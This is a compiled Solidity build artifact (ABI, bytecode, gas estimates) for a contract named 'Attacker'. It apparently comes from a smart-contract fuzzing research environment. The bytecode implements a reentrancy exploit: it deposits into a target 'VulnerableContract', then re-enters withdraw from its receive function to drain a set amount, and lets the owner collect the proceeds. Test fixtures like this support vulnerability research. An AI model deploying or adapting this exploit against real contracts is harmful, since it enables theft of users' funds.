{
    "contractName": "Attacker",
    "abi": [
        {
            "inputs": [
                {
                    "internalType": "address payable",
                    "name": "_vulnerableAddress",
                    "type": "address"
                }
            ],
            "stateMutability": "nonpayable",
            "type": "constructor"
        },
        {
            "inputs": [
                {
                    "internalType": "uint256",
                    "name": "_targetAmount",
                    "type": "uint256"
                }
            ],
            "name": "attack",
            "outputs": [],
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "deposit",
            "outputs": [],
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "drainedAmount",
            "outputs": [
                {
                    "internalType": "uint256",
                    "name": "",
                    "type": "uint256"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "owner",
            "outputs": [
                {
                    "internalType": "address",
                    "name": "",
                    "type": "address"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "prevBalanceVulnerableContract",
            "outputs": [
                {
                    "internalType": "uint256",
                    "name": "",
                    "type": "uint256"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "targetAmount",
            "outputs": [
                {
                    "internalType": "uint256",
                    "name": "",
                    "type": "uint256"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "vulnerable",
            "outputs": [
                {
                    "internalType": "contract VulnerableContract",
                    "name": "",
                    "type": "address"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "withdrawFunds",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "stateMutability": "payable",
            "type": "receive"
        }
    ],
    "bytecode": "608034607c57601f61050638819003918201601f19168301916001600160401b03831184841017608057808492602094604052833981010312607c57516001600160a01b03811690819003607c575f80546001600160a01b0319908116929092179055600180549091163317905560405161047190816100958239f35b5f80fd5b634e487b7160e01b5f52604160045260245ffdfe60808060405260043610156100e7575b50361561001a575f80fd5b60018060a01b035f54168031600354600254808210806100db575b61003b57005b816100459161042e565b918083116100d3575b508181018091116100bf57806003556100698260045461042e565b60045561007257005b813b156100bb575f91602483926040519485938492632e1a7d4d60e01b845260048401525af180156100b0576100a457005b5f6100ae916103f8565b005b6040513d5f823e3d90fd5b5f80fd5b634e487b7160e01b5f52601160045260245ffd5b91505f61004e565b50826004541015610035565b5f905f3560e01c9081630f5ea827146103de5750806324600fc31461035557806364dd891a146101e457806384670062146101c65780638da5cb5b1461019d578063953b8fb81461017f578063d0e30db0146101705763f66ad59a0361000f573461016d578060031936011261016d57546040516001600160a01b039091168152602090f35b80fd5b508060031936011261016d5780f35b503461016d578060031936011261016d576020600254604051908152f35b503461016d578060031936011261016d576001546040516001600160a01b039091168152602090f35b503461016d578060031936011261016d576020600454604051908152f35b5060203660031901126100bb5760043534156103065780156102b5576002555f6003819055546001600160a01b0316803b156100bb575f60049160405192838092630d0e30db60e41b825234905af180156100b0576102a2575b5080546001600160a01b031680316004558190803b1561029f57818091602460405180948193632e1a7d4d60e01b83523460048401525af18015610294576102835750f35b8161028d916103f8565b61016d5780f35b6040513d84823e3d90fd5b50fd5b6102ae91505f906103f8565b5f5f61023e565b60405162461bcd60e51b8152602060048201526024808201527f54617267657420616d6f756e74206d75737420626520677265617465722074686044820152630616e20360e41b6064820152608490fd5b60405162461bcd60e51b815260206004820152602160248201527f4e65656420746f2073656e6420736f6d6520457468657220746f2061747461636044820152606b60f81b6064820152608490fd5b346100bb575f3660031901126100bb576001546001600160a01b031633819003610399575f808080934790828215610390575bf1156100b057005b506108fc610388565b60405162461bcd60e51b815260206004820152601760248201527f4f6e6c79206f776e65722063616e2077697468647261770000000000000000006044820152606490fd5b346100bb575f3660031901126100bb576020906003548152f35b90601f8019910116810190811067ffffffffffffffff82111761041a57604052565b634e487b7160e01b5f52604160045260245ffd5b919082039182116100bf5756fea2646970667358221220613f0142d50e7362ccb93dd9fa2ce6b360aa95c466343badad01c5ef5f08913364736f6c634300081b0033",
    "sourcePath": "c:/Users/andri/dev/github/smartcontractdrlfuz/env1_dev2/contracts/Attacker.sol",
    "compiler": {
        "name": "solc",
        "version": "0.8.27+commit.40a35a09"
    },
    "functionHashes": {
        "attack(uint256)": "64dd891a",
        "deposit()": "d0e30db0",
        "drainedAmount()": "0f5ea827",
        "owner()": "8da5cb5b",
        "prevBalanceVulnerableContract()": "84670062",
        "targetAmount()": "953b8fb8",
        "vulnerable()": "f66ad59a",
        "withdrawFunds()": "24600fc3"
    },
    "gasEstimates": {
        "creation": {
            "codeDepositCost": "227400",
            "executionCost": "infinite",
            "totalCost": "infinite"
        },
        "external": {
            "attack(uint256)": "infinite",
            "deposit()": "258",
            "drainedAmount()": "2253",
            "owner()": "2376",
            "prevBalanceVulnerableContract()": "2330",
            "targetAmount()": "2374",
            "vulnerable()": "2433",
            "withdrawFunds()": "infinite"
        }
    }
}